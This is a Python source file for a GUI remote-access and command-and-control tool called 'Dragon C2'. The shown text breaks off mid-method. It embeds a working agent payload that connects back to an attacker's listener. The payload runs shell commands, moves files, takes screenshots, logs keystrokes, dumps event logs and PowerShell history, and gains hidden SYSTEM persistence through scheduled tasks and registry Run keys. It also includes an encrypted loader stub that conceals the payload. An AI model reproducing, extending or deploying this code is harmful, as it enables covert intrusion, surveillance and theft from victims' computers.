import socket
import threading
import tkinter as tk
from tkinter import ttk, Label, Entry, Button, scrolledtext, filedialog, messagebox, END, Checkbutton, IntVar, simpledialog, Radiobutton
import base64
import os
import subprocess
import shutil
import sys
import math
from queue import Queue
from datetime import datetime
import string
import time
import zipfile
import traceback
import tempfile

try:
    import pyaes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Try to import win32com for advanced persistence
try:
    import win32com.client
    WIN32COM_AVAILABLE = True
except ImportError:
    WIN32COM_AVAILABLE = False


# --- Enhanced Persistence Code Snippet (Using COM for Stealth) ---
PERSISTENCE_SNIPPET = """
import sys, os, shutil
if os.name == 'nt':
    try:
        import win32com.client
        COM_AVAILABLE = True
    except ImportError:
        COM_AVAILABLE = False

def achieve_persistence():
    if os.name != 'nt':
        return
    try:
        app_name = "SystemMonitor"
        app_data_path = os.environ["APPDATA"]
        persistence_dir = os.path.join(app_data_path, app_name)
        if not os.path.exists(persistence_dir):
            os.makedirs(persistence_dir)
        
        executable_path = sys.executable
        persistence_path = os.path.join(persistence_dir, os.path.basename(executable_path))
        
        if executable_path.lower() != persistence_path.lower():
            shutil.copyfile(executable_path, persistence_path)
        
        task_name = "SystemCriticalUpdate"
        
        if COM_AVAILABLE:
            # Use COM for stealthier task creation
            try:
                scheduler = win32com.client.Dispatch("Schedule.Service")
                scheduler.Connect()
                root_folder = scheduler.GetFolder("\\\\")
                task_def = scheduler.NewTask(0)  # TASK_DEFINITION_TYPE
                task_def.RegistrationInfo.Description = "System Critical Update"
                task_def.Settings.Enabled = True
                task_def.Settings.StartWhenAvailable = True
                task_def.Settings.Hidden = True  # Hide the task
                task_def.Settings.RunOnlyIfIdle = False  # Run even if idle
                task_def.Settings.ExecutionTimeLimit = "PT0S"  # No time limit
                task_def.Settings.StartWhenAvailable = True  # Run as soon as possible after missed start
                
                # Action: Run the payload
                action = task_def.Actions.Create(0)  # TASK_ACTION_EXEC
                action.Path = persistence_path
                action.WorkingDirectory = persistence_dir
                
                # Trigger: At system startup AND logon (dual trigger for reliability)
                # Boot trigger
                trigger_boot = task_def.Triggers.Create(1)  # TASK_TRIGGER_BOOT
                trigger_boot.Enabled = True
                
                # Logon trigger as fallback
                trigger_logon = task_def.Triggers.Create(9)  # TASK_TRIGGER_LOGON
                trigger_logon.Enabled = True
                trigger_logon.UserId = os.environ.get('USERNAME', 'SYSTEM')
                
                # Principal: Run as SYSTEM
                principal = task_def.Principal
                principal.RunLevel = 1  # TASK_RUNLEVEL_HIGHEST
                principal.LogonType = 4  # TASK_LOGON_SERVICE_ACCOUNT
                principal.UserId = "SYSTEM"
                principal.Password = None
                
                # Register the task
                root_folder.RegisterTaskDefinition(task_name, task_def, 6, None, None, 0)  # CREATE_OR_UPDATE
                return
            except Exception:
                pass
        
        # Fallback: Use schtasks with boot and logon triggers
        cmd_boot = f'schtasks /create /tn "{task_name}_Boot" /tr "{persistence_path}" /sc onstart /ru SYSTEM /rl HIGHEST /f /it /rs'
        subprocess.run(cmd_boot, shell=True, capture_output=True, check=False)
        cmd_logon = f'schtasks /create /tn "{task_name}_Logon" /tr "{persistence_path}" /sc onlogon /ru "{os.environ.get("USERNAME", "SYSTEM")}" /rl HIGHEST /f /it /rs'
        subprocess.run(cmd_logon, shell=True, capture_output=True, check=False)
        
        # Additional fallback: Registry
        try:
            import winreg as reg
            key = reg.HKEY_CURRENT_USER
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with reg.OpenKey(key, key_path, 0, reg.KEY_WRITE) as registry_key:
                reg.SetValueEx(registry_key, app_name, 0, reg.REG_SZ, f'"{persistence_path}"')
        except Exception:
            pass
            
    except Exception:
        pass

achieve_persistence()
"""

# AGENT PAYLOAD TEMPLATE v14.2 (Protocol Update)
UNIFIED_AGENT_TEMPLATE = """
import socket, subprocess, os, base64, threading, time, string, shutil, sys, zipfile, tempfile
if os.name == 'nt':
    try:
        import winreg as reg
    except ImportError:
        pass
{PERSISTENCE_CODE}
try:
    import pynput.keyboard
    PYNPUT_OK = True
except ImportError: PYNPUT_OK = False
try:
    import mss
    MSS_OK = True
except ImportError: MSS_OK = False

ATTACKER_HOST, ATTACKER_PORT, BUFFER_SIZE, RETRY_INTERVAL = '{LHOST}', {LPORT}, 4096, 5  # Reduced retry to 5s for faster reconnect

# Simple log file for debugging persistence
LOG_FILE = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'agent_debug.log')
def log_message(msg):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\\n")
    except: pass

log_message("Agent started - attempting connection")

def take_screenshot():
    if not MSS_OK: return base64.b64encode(b'ERROR: "mss" library not bundled.')
    try:
        with mss.mss() as sct:
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmpf:
                tmp_path = sct.shot(mon=-1, output=tmpf.name)
            with open(tmp_path, 'rb') as f: file_data = f.read()
            os.unlink(tmp_path)
        return base64.b64encode(file_data)
    except Exception as e: return base64.b64encode(f"ERROR: {str(e)}".encode())

def run_keylogger():
    if not PYNPUT_OK: return False, "'pynput' library not bundled."
    try:
        log_dir = os.environ.get('APPDATA', os.path.expanduser('~'))
        LOG_FILE = os.path.join(log_dir, '.keylogs.txt')
        def on_press(key):
            try:
                with open(LOG_FILE, 'a', encoding='utf-8') as f: f.write(str(key.char))
            except AttributeError:
                with open(LOG_FILE, 'a', encoding='utf-8') as f: f.write(f'[{str(key)}]')
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        return True, None
    except Exception as e: return False, str(e)

def self_destruct():
    if os.name != 'nt':
        try: os.remove(sys.executable)
        except: pass
        sys.exit(0)

    try:
        app_name = "SystemMonitor"
        
        # Delete Registry Key Only
        try:
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE) as registry_key:
                reg.DeleteValue(registry_key, app_name)
        except FileNotFoundError: pass

        # Delete the payload from its location (current executable and persistence path)
        app_data_path = os.environ.get("APPDATA", "")
        persistence_dir = os.path.join(app_data_path, app_name) if app_data_path else ""
        persistence_path = os.path.join(persistence_dir, os.path.basename(sys.executable)) if persistence_dir else sys.executable
        
        temp_dir = os.environ.get('TEMP', os.environ.get('TMP', '.'))
        batch_file_path = os.path.join(temp_dir, f'cleanup_{int(time.time())}.bat')

        with open(batch_file_path, 'w') as f:
            f.write('@echo off' + chr(10))
            f.write('chcp 65001 > nul' + chr(10))
            f.write('timeout /t 2 /nobreak > NUL' + chr(10))
            f.write(f'del "{sys.executable}"' + chr(10))
            if os.path.exists(persistence_path) and persistence_path != sys.executable:
                f.write(f'del "{persistence_path}"' + chr(10))
            f.write(f'del "%~f0"' + chr(10))

        subprocess.Popen(f'"{batch_file_path}"', shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
        sys.exit(0)
    except Exception:
        sys.exit(0)

# Add a small delay on startup to ensure network is up
time.sleep(10)
log_message("Delay completed - entering connection loop")

while True:
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_HOST, ATTACKER_PORT))
        log_message("Connected to C2 server")
        while True:
            command_data = s.recv(BUFFER_SIZE).decode('utf-8', 'ignore')
            if not command_data: break
            
            command_parts = command_data.split(' ', 1)
            command, args = command_parts[0], command_parts[1] if len(command_parts) > 1 else ""
            response = b''
            
            try:
                if command == "CMD_DOWNLOAD":
                    clean_args = args.strip('"')
                    if os.path.exists(clean_args) and os.path.isfile(clean_args):
                        filesize = os.path.getsize(clean_args)
                        s.sendall(f"FILE_OK:{filesize}<<EOT>>".encode())
                        time.sleep(0.1)
                        with open(clean_args, 'rb') as f:
                            while (chunk := f.read(BUFFER_SIZE)): s.sendall(chunk)
                    else:
                        s.sendall(b"FILE_ERR:File not found.<<EOT>>")
                    continue

                elif command == "CMD_UPLOAD":
                    filepath, filesize_str = args.rsplit(':', 1)
                    filesize = int(filesize_str)
                    os.makedirs(os.path.dirname(filepath) or '.', exist_ok=True)
                    s.sendall(b"UPLOAD_READY")
                    with open(filepath, 'wb') as f:
                        bytes_received = 0
                        while bytes_received < filesize:
                            chunk = s.recv(BUFFER_SIZE)
                            if not chunk: break
                            f.write(chunk); bytes_received += len(chunk)
                    response = f"File uploaded to {filepath}".encode()

                elif command == "CMD_ELEVATE_PRIVS":
                    if os.name != 'nt':
                        response = b"ERROR: This privilege escalation technique is for Windows only."
                    else:
                        payload_path = sys.executable
                        cmd = f'schtasks /create /tn "SystemCriticalUpdate" /tr "{payload_path}" /sc onstart /ru system /f'
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
                        response = (result.stdout + result.stderr).encode('utf-8', 'ignore')
                        if not response: response = b"Command executed, but no output was returned."

                elif command == "CMD_GET_RECENT_FILES":
                    if os.name != 'nt':
                        response = b"ERROR: This feature is designed for Windows."
                    else:
                        recent_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Recent')
                        if os.path.exists(recent_folder):
                            try:
                                files = os.listdir(recent_folder)
                                response = (chr(10).join(files) if files else "No recent files found.").encode('utf-8', 'ignore')
                            except Exception as e:
                                response = f"ERROR: Could not read recent files folder: {e}".encode()
                        else:
                            response = b"ERROR: Recent files folder not found."
                
                elif command == "CMD_GET_EVENT_LOGS":
                    if os.name != 'nt':
                        response = base64.b64encode(b"ERROR: Event logs are only available on Windows.") + b'<<EOF>>'
                    else:
                        temp_dir = os.path.join(os.environ.get('TEMP', '.'), f'logs_{int(time.time())}')
                        try:
                            os.makedirs(temp_dir, exist_ok=True)
                            logs_to_export = ['System', 'Application', 'Security']
                            exported_files = []
                            for log in logs_to_export:
                                export_path = os.path.join(temp_dir, f'{log}.evtx')
                                cmd = f'wevtutil epl "{log}" "{export_path}"'
                                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                                if result.returncode == 0 and os.path.exists(export_path):
                                    exported_files.append(export_path)

                            if not exported_files:
                                response = base64.b64encode(b"ERROR: No event logs could be exported. This may require administrator privileges.") + b'<<EOF>>'
                            else:
                                zip_path = os.path.join(temp_dir, 'event_logs.zip')
                                with zipfile.ZipFile(zip_path, 'w') as zf:
                                    for f in exported_files:
                                        zf.write(f, os.path.basename(f))
                                with open(zip_path, 'rb') as f:
                                    zip_data = f.read()
                                response = base64.b64encode(zip_data) + b'<<EOF>>'
                        except Exception as e:
                            response = base64.b64encode(f"ERROR: Failed to process event logs: {str(e)}".encode()) + b'<<EOF>>'
                        finally:
                            if os.path.exists(temp_dir): shutil.rmtree(temp_dir)

                elif command == "CMD_GET_PS_HISTORY":
                    if os.name != 'nt':
                        response = base64.b64encode(b"ERROR: PowerShell history is only available on Windows.") + b'<<EOF>>'
                    else:
                        history_paths = [
                            os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), 'Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt')
                        ]
                        history_data = b''
                        for path in history_paths:
                            if os.path.exists(path):
                                try:
                                    with open(path, 'r', encoding='utf-8') as f:
                                        history_data += (f.read() + chr(10)).encode('utf-8')
                                except:
                                    try:
                                        with open(path, 'rb') as f:
                                            history_data += f.read()
                                    except:
                                        pass
                        if history_data:
                            response = base64.b64encode(history_data) + b'<<EOF>>'
                        else:
                            response = base64.b64encode(b"No PowerShell history found.") + b'<<EOF>>'

                elif command == "CMD_SYSTEM_INFO":
                    if os.name != 'nt':
                        response = b"ERROR: System info is only available on Windows."
                    else:
                        output = subprocess.run('systeminfo', shell=True, capture_output=True)
                        response = output.stdout + output.stderr if output.stdout or output.stderr else b"Could not get system info."

                elif command == "CMD_NETWORK_INFO":
                    if os.name != 'nt':
                        response = b"ERROR: Network info is only available on Windows."
                    else:
                        output = subprocess.run('ipconfig /all', shell=True, capture_output=True)
                        response = output.stdout + output.stderr if output.stdout or output.stderr else b"Could not get network info."

                elif command == "CMD_DELETE":
                    clean_path = args.strip('"')
                    if os.path.exists(clean_path):
                        try:
                            if os.path.isfile(clean_path):
                                os.remove(clean_path)
                                response = f"File '{clean_path}' deleted successfully.".encode()
                            elif os.path.isdir(clean_path):
                                shutil.rmtree(clean_path)
                                response = f"Directory '{clean_path}' and its contents deleted successfully.".encode()
                        except Exception as e: response = f"ERROR: Failed to delete '{clean_path}'. Reason: {e}".encode()
                    else: response = b"ERROR: File or directory not found."
                
                elif command == "CMD_LIST_PROCS":
                    output = subprocess.run('tasklist', shell=True, capture_output=True)
                    response = output.stdout + output.stderr if output.stdout or output.stderr else b"Could not get process list."
                
                elif command == "CMD_LIST_APPS":
                    cmd = 'powershell "Get-ItemProperty HKLM:\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize"'
                    output = subprocess.run(cmd, shell=True, capture_output=True)
                    response = output.stdout + output.stderr if output.stdout or output.stderr else b"Could not get installed programs."
                
                elif command == "CMD_NETSTAT":
                    output = subprocess.run('netstat -an', shell=True, capture_output=True)
                    response = output.stdout + output.stderr if output.stdout or output.stderr else b"Could not get network connections."
                
                elif command == "CMD_SELF_DESTRUCT":
                    s.close(); self_destruct(); break
                
                elif command == "CMD_EXECUTE":
                    subprocess.Popen(args, shell=True); response = f"Attempted to execute {args}.".encode()
                
                elif command == "CMD_LIST_DIR":
                    clean_args = args.strip('"')
                    try:
                        items = os.listdir(clean_args)
                        res_str = ""
                        for item in items:
                            item_path = os.path.join(clean_args, item)
                            item_type = "Directory" if os.path.isdir(item_path) else "File"
                            try: item_size = str(os.path.getsize(item_path)) if item_type == "File" else ""
                            except: item_size = "N/A"
                            res_str += f"{item}|{item_type}|{item_size}\\n"
                        response = res_str.strip().encode('utf-8', 'ignore') if res_str.strip() else b" "
                    except Exception as e:
                        response = f"ERROR: Could not list directory '{clean_args}'. Reason: {e}".encode()

                elif command == "CMD_LIST_DRIVES":
                    if os.name == 'nt':
                        drives = [f'{d}:\\\\' for d in string.ascii_uppercase if os.path.exists(f'{d}:')]
                        res_str = "".join([f"{drive}|Drive|\\n" for drive in drives]) if drives else " "
                        response = res_str.encode('utf-8', 'ignore')
                    else: response = ("/|Drive|" + chr(10)).encode('utf-8', 'ignore')
                
                elif command == "CMD_SCREENSHOT": response = take_screenshot() + b'<<EOF>>'
                elif command == "CMD_DEPLOY_KEYLOGGER": success, error = run_keylogger(); response = b'Keylogger deployed.' if success else f'ERROR: {error}'.encode()
                elif command == "CMD_GET_KEYLOGS":
                    log_path = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), '.keylogs.txt')
                    if os.path.exists(log_path):
                        with open(log_path, 'rb') as f: response = base64.b64encode(f.read()) + b'<<EOF>>'
                    else: response = base64.b64encode(b"Log file not found.") + b'<<EOF>>'
                elif command == "CMD_CLEAN_KEYLOGS":
                    log_path = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), '.keylogs.txt')
                    if os.path.exists(log_path): os.remove(log_path); response = b"Keylog file removed."
                    else: response = b"ERROR: Keylog file not found."
                else:
                    full_command = f"{command} {args}".strip()
                    output = subprocess.run(full_command, shell=True, capture_output=True)
                    response = output.stdout + output.stderr
                    if not response: response = b" "
            except Exception as e: response = f"ERROR: {str(e)}".encode('utf-8', 'ignore')
            
            if response:
                if not response.endswith(b'<<EOF>>'):
                    response += b'<<EOT>>'
                s.sendall(response)
    except Exception as e:
        log_message(f"Connection failed: {str(e)}")
        time.sleep(RETRY_INTERVAL)
    finally:
        if s: s.close()
"""


# LOADER STUB FOR ENCRYPTED EXE PAYLOAD
LOADER_STUB_TEMPLATE = """
import base64, pyaes, os
KEY, IV, CIPHERTEXT = base64.b64decode("{KEY}"), base64.b64decode("{IV}"), base64.b64decode("{CIPHERTEXT}")
def decrypt_payload(key, iv, ciphertext):
    aes = pyaes.AESModeOfOperationCBC(key, iv=iv)
    decrypter = pyaes.Decrypter(aes)
    decrypted = decrypter.feed(ciphertext) + decrypter.feed()
    return (lambda s: s[:-s[-1]])(decrypted).decode('utf-8')
try: exec(decrypt_payload(KEY, IV, CIPHERTEXT))
except Exception: pass
"""

class C2Framework(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Dragon C2")
        self.geometry("1500x900")
        self.configure(bg="#000000")
        self.sessions, self.selected_session_var, self.listener_socket, self.listener_thread = {}, tk.StringVar(self), None, None
        self.session_widgets = {}
        self.gui_queue = Queue()
        self.after(100, self.process_gui_queue)
        self.loot_dir = os.path.join(os.getcwd(), "c2_loot"); os.makedirs(self.loot_dir, exist_ok=True)
        self._setup_styles()
        self._create_context_menu()
        self._create_widgets()

    def process_gui_queue(self):
        try:
            while not self.gui_queue.empty():
                msg_type, data = self.gui_queue.get_nowait()
                if msg_type == "output": 
                    if not data.endswith('\n'):
                        data += '\n'
                    self.session_output.insert(tk.END, data); self.session_output.see(tk.END)
                elif msg_type == "add_session": self._add_session_widget(data)
                elif msg_type == "remove_session": self._remove_session_widget(data)
                elif msg_type == "update_tree":
                    self.tree.delete(*self.tree.get_children())
                    for item in data: self.tree.insert("", END, text=item["name"], values=(item["type"], item["size"]))
        finally: self.after(100, self.process_gui_queue)

    def queue_message(self, msg_type, data): self.gui_queue.put((msg_type, data))
    
    def _setup_styles(self):
        self.style = ttk.Style(self)
        self.style.theme_use("clam")
        self.style.configure(".", background="#000000", foreground="#ff7300", font=("Consolas", 10))
        self.style.configure("TFrame", background="#000000")
        self.style.configure("TLabel", background="#000000", foreground="#00ff00")
        self.style.configure("TLabelframe", background="#000000", bordercolor="#ff6a00", relief="solid")
        self.style.configure("TLabelframe.Label", background="#000000", foreground="#00ff00", font=("Consolas", 12, "bold"))
        self.style.configure("Treeview", rowheight=25, fieldbackground="#101010", background="#101010", foreground="#00ff00", font=("Consolas", 10))
        self.style.map('Treeview', background=[('selected', '#008000')])
        self.style.configure("Treeview.Heading", font=('Consolas', 11,'bold'), background="#000000AE", foreground="#ff7300")
        self.style.configure("Vertical.TScrollbar", background="#101010", troughcolor="#000000", arrowcolor="#ff7300")
        self.style.configure("TRadiobutton", background="#000000", foreground="#ff5500", indicatorbackground="#101010", indicatorforeground="#ff7700", font=("Consolas", 10))
        self.style.map("TRadiobutton", indicatorbackground=[('selected', "#ff6600")])
        self.style.configure("TPanedwindow", background="#ff3700")

    def _create_context_menu(self):
        self.context_menu = tk.Menu(self, tearoff=0, bg="#101010", fg="#ff8000", font=("Consolas", 10))
        self.context_menu.add_command(label="Cut", command=lambda: self.focus_get().event_generate("<<Cut>>"))
        self.context_menu.add_command(label="Copy", command=lambda: self.focus_get().event_generate("<<Copy>>"))
        self.context_menu.add_command(label="Paste", command=lambda: self.focus_get().event_generate("<<Paste>>"))
        self.bind_class("Entry", "<Button-3><ButtonRelease-3>", self._show_context_menu)

    def _show_context_menu(self, event):
        self.context_menu.tk_popup(event.x_root, event.y_root)
        
    def _create_widgets(self):
        # Dragon-themed header مع تحسين
        header_text = """
    ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗    🐉
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔════╝ ████╗  ██║   COMMAND & CONTROL
    ██║  ██║██████╔╝███████║██║  ███╗██║  ███╗██╔██╗ ██║     FRAMEWORK
    ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║       v2.0
    ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║    🐉
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
        """
        
        header = tk.Frame(self, bg="#101010"); header.pack(fill=tk.X)
        Label(header, text=header_text, font=("Courier", 8, "bold"), fg="#00ff00", bg="#101010", justify=tk.LEFT).pack(padx=20, pady=5)
        
        main_pane = ttk.PanedWindow(self, orient=tk.HORIZONTAL, style="TPanedwindow"); main_pane.pack(expand=True, fill='both', padx=10, pady=10)
        left_frame = ttk.Frame(main_pane, width=450); main_pane.add(left_frame, weight=1)
        right_frame = ttk.Frame(main_pane); main_pane.add(right_frame, weight=3)
        self._create_control_deck(left_frame); self._create_operations_view(right_frame)

    def _create_control_deck(self, parent):
        listener_frame = ttk.LabelFrame(parent, text=" LISTENER "); listener_frame.pack(fill=tk.X, padx=5, pady=5)
        Label(listener_frame, text="Port:").pack(side=tk.LEFT, padx=(10,5), pady=10)
        self.listen_port_entry = Entry(listener_frame, width=8, font=("Consolas", 10), bg="#101010", fg="#00ff00", relief="flat", insertbackground="#00ff00"); self.listen_port_entry.pack(side=tk.LEFT, pady=10); self.listen_port_entry.insert(0, "4444")
        self.start_button = tk.Button(listener_frame, text="Start", command=self.start_listener_thread, bg="#008000", fg="#000000", relief="flat", font=("Consolas", 10, "bold")); self.start_button.pack(side=tk.LEFT, padx=5, pady=10)
        self.stop_button = tk.Button(listener_frame, text="Stop", state="disabled", command=self.stop_listener, bg="#8B0000", fg="#00ff00", relief="flat", font=("Consolas", 10, "bold")); self.stop_button.pack(side=tk.LEFT, pady=10)
        self.listener_status = Label(listener_frame, text="Offline", fg="#8B0000", font=("Consolas", 10, "bold")); self.listener_status.pack(side=tk.LEFT, padx=10, pady=10)
        
        gen_frame = ttk.LabelFrame(parent, text=" PAYLOAD GENERATOR "); gen_frame.pack(fill=tk.X, padx=5, pady=10)
        Label(gen_frame, text="LHOST:").grid(row=0, column=0, padx=10, pady=5, sticky='w')
        self.lhost_entry = Entry(gen_frame, font=("Consolas", 10), bg="#101010", fg="#00ff00", relief="flat", insertbackground="#00ff00"); self.lhost_entry.grid(row=0, column=1, padx=10, pady=5, sticky='ew')
        Label(gen_frame, text="LPORT:").grid(row=1, column=0, padx=10, pady=5, sticky='w')
        self.lport_gen_entry = Entry(gen_frame, font=("Consolas", 10), bg="#101010", fg="#00ff00", relief="flat", insertbackground="#00ff00"); self.lport_gen_entry.grid(row=1, column=1, padx=10, pady=5, sticky='ew')
        self.persistence_var = IntVar(value=1)
        persistence_check = Checkbutton(gen_frame, text="Add Persistence (Windows)", variable=self.persistence_var, bg="#000000", fg="#00ff00", selectcolor="#101010", activebackground="#000000", activeforeground="#00ff00", font=("Consolas", 10))
        persistence_check.grid(row=2, column=0, columnspan=2, sticky='w', padx=10)
        self.generate_exe_var = IntVar(value=1)
        exe_check = Checkbutton(gen_frame, text="Generate Standalone Payload", variable=self.generate_exe_var, bg="#000000", fg="#00ff00", selectcolor="#101010", activebackground="#000000", activeforeground="#00ff00", font=("Consolas", 10))
        exe_check.grid(row=3, column=0, columnspan=2, sticky='w', padx=10)
        
        self.require_admin_var = IntVar(value=0)
        admin_check = Checkbutton(gen_frame, text="Require Admin Privileges (UAC)", variable=self.require_admin_var, bg="#000000", fg="#00ff00", selectcolor="#101010", activebackground="#000000", activeforeground="#00ff00", font=("Consolas", 10))
        admin_check.grid(row=4, column=0, columnspan=2, sticky='w', padx=10)

        self.generate_button = tk.Button(gen_frame, text="Generate Payload", command=self.start_payload_generation_thread, bg="#008000", fg="#000000", relief="flat", font=("Consolas", 11, "bold")); self.generate_button.grid(row=5, column=0, columnspan=2, pady=15)
        gen_frame.grid_columnconfigure(1, weight=1)

        sessions_frame = ttk.LabelFrame(parent, text=" SESSIONS "); sessions_frame.pack(fill=tk.X, padx=5, pady=5)
        self.sessions_canvas = tk.Canvas(sessions_frame, bg="#000000", highlightthickness=0, height=100)
        self.sessions_scrollbar = ttk.Scrollbar(sessions_frame, orient="vertical", command=self.sessions_canvas.yview)
        self.sessions_scrollable_frame = ttk.Frame(self.sessions_canvas)
        self.sessions_scrollable_frame.bind("<Configure>", lambda e: self.sessions_canvas.configure(scrollregion=self.sessions_canvas.bbox("all")))
        self.sessions_canvas.create_window((0, 0), window=self.sessions_scrollable_frame, anchor="nw")
        self.sessions_canvas.configure(yscrollcommand=self.sessions_scrollbar.set)
        self.sessions_canvas.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        self.sessions_scrollbar.pack(side="right", fill="y")
        
        actions_pane = ttk.PanedWindow(parent, orient=tk.VERTICAL); actions_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=10)
        shell_cmd_frame = ttk.LabelFrame(actions_pane, text=" SHELL COMMAND ", height=100); actions_pane.add(shell_cmd_frame)
        actions_frame = ttk.LabelFrame(actions_pane, text=" QUICK ACTIONS "); actions_pane.add(actions_frame)
        
        command_frame = tk.Frame(shell_cmd_frame, bg="#000000")
        command_frame.pack(fill=tk.X, padx=10, pady=10)
        Label(command_frame, text=">").pack(side=tk.LEFT)
        self.session_command_entry = Entry(command_frame, font=("Consolas", 11), bg="#101010", fg="#00ff00", relief="flat", insertbackground="#00ff00"); self.session_command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5); self.session_command_entry.bind("<Return>", self.send_shell_command)
        tk.Button(command_frame, text="Send", command=self.send_shell_command, bg="#008000", fg="#000000", relief="flat", font=("Consolas", 10, "bold")).pack(side=tk.LEFT)

        button_frame = tk.Frame(actions_frame, bg="#000000")
        button_frame.pack(pady=5, padx=5)
        
        quick_actions = [
            ("Screenshot", "CMD_SCREENSHOT", "#008080"), 
            ("Get Recent Files", "CMD_GET_RECENT_FILES", "#1E90FF"),
            ("System Info", "CMD_SYSTEM_INFO", "#FF1493"),
            ("Network Info", "CMD_NETWORK_INFO", "#00BFFF"),
            ("List Processes", "CMD_LIST_PROCS", "#00008B"),
            ("List Programs", "CMD_LIST_APPS", "#00008B"),
            ("Netstat", "CMD_NETSTAT", "#00008B"),
            ("Get PS History", "CMD_GET_PS_HISTORY", "#1E90FF"),
            ("Get Event Logs", "CMD_GET_EVENT_LOGS", "#4682B4"),
            ("Deploy Keys", "CMD_DEPLOY_KEYLOGGER", "#8B0000"),
            ("Get Keys", "CMD_GET_KEYLOGS", "#B8860B"), 
            ("Clean Keys", "CMD_CLEAN_KEYLOGS", "#8B0000"),
            ("Elevate Privs (Task)", "CMD_ELEVATE_PRIVS", "#9932CC"),
            ("Remove Payload", self.confirm_self_destruct, "#FF4500")
        ]
        
        for i, (text, action, color) in enumerate(quick_actions):
            row, col = divmod(i, 4)
            command_to_run = action if callable(action) else (lambda c=action: self.send_command(c))
            tk.Button(button_frame, text=text, command=command_to_run, bg=color, fg="#FFFFFF", relief="flat", font=("Consolas", 10, "bold"), width=18).grid(row=row, column=col, padx=5, pady=5)
        
    def _create_operations_view(self, parent):
        ops_pane = ttk.PanedWindow(parent, orient=tk.VERTICAL); ops_pane.pack(fill='both', expand=True, pady=0)
        file_browser_frame = ttk.LabelFrame(ops_pane, text=" FILE BROWSER "); ops_pane.add(file_browser_frame, weight=3)
        shell_output_frame = ttk.LabelFrame(ops_pane, text=" LOGS & OUTPUT "); ops_pane.add(shell_output_frame, weight=2)
        
        fb_top_bar = tk.Frame(file_browser_frame, bg="#000000"); fb_top_bar.pack(fill=tk.X, padx=5, pady=5)
        tk.Button(fb_top_bar, text="Drives", command=self.list_drives, bg="#008000", fg="#000000", relief="flat", font=("Consolas", 10, "bold")).pack(side=tk.LEFT, padx=(0, 5))
        Label(fb_top_bar, text="Path:").pack(side=tk.LEFT)
        self.path_entry = Entry(fb_top_bar, font=("Consolas", 10), bg="#101010", fg="#00ff00", relief="flat", insertbackground="#00ff00"); self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        tk.Button(fb_top_bar, text="Browse", command=self.browse_path, bg="#008000", fg="#000000", relief="flat", font=("Consolas", 10, "bold")).pack(side=tk.LEFT)
        
        fb_content_frame = tk.Frame(file_browser_frame, bg="#000000"); fb_content_frame.pack(fill=tk.BOTH, expand=True)
        tree_frame = tk.Frame(fb_content_frame); tree_frame.pack(side=tk.LEFT, expand=True, fill='both')
        self.tree = ttk.Treeview(tree_frame, columns=("Type", "Size"), show="tree headings"); self.tree.heading("#0", text="Name"); self.tree.heading("Type", text="Type"); self.tree.heading("Size", text="Size"); self.tree.column("#0", width=350, stretch=tk.YES); self.tree.column("Type", width=100, anchor='center', stretch=tk.NO); self.tree.column("Size", width=120, anchor='e', stretch=tk.NO)
        self.tree.pack(side=tk.LEFT, expand=True, fill='both', padx=(5,0), pady=5)
        self.tree.bind("<Double-1>", self.on_tree_double_click)
        
        file_qc_frame = tk.Frame(fb_content_frame, bg="#000000"); file_qc_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=10, pady=5)
        file_commands = [
            ("↑ Upload", self.upload_file, "#008000"), 
            ("↓ Download", self.download_file, "#B8860B"), 
            ("▶ Execute", self.execute_file, "#9400D3"),
            ("✘ Delete", self.delete_item, "#FF0000")
        ]
        [tk.Button(file_qc_frame, text=text, command=cmd, bg=color, fg="#FFFFFF", relief="flat", font=("Consolas", 10, "bold"), anchor='w').pack(fill=tk.X, pady=4) for text, cmd, color in file_commands]
        
        self.session_output = scrolledtext.ScrolledText(shell_output_frame, wrap=tk.WORD, bg="#000000", fg="#00ff00", font=("Consolas", 11), insertbackground="white", relief="solid", borderwidth=1, bd=0); self.session_output.pack(expand=True, fill='both', padx=10, pady=5)
    
    def _add_session_widget(self, session_id):
        frame = ttk.Frame(self.sessions_scrollable_frame, style="TFrame")
        rb = ttk.Radiobutton(frame, text=session_id, variable=self.selected_session_var, value=session_id, command=self.on_session_select, style="TRadiobutton")
        rb.pack(side="left", anchor="w", padx=5, pady=2)
        frame.pack(fill="x", expand=True)
        self.session_widgets[session_id] = frame
        if not self.selected_session_var.get():
            rb.invoke()

    def _remove_session_widget(self, session_id):
        if session_id in self.session_widgets:
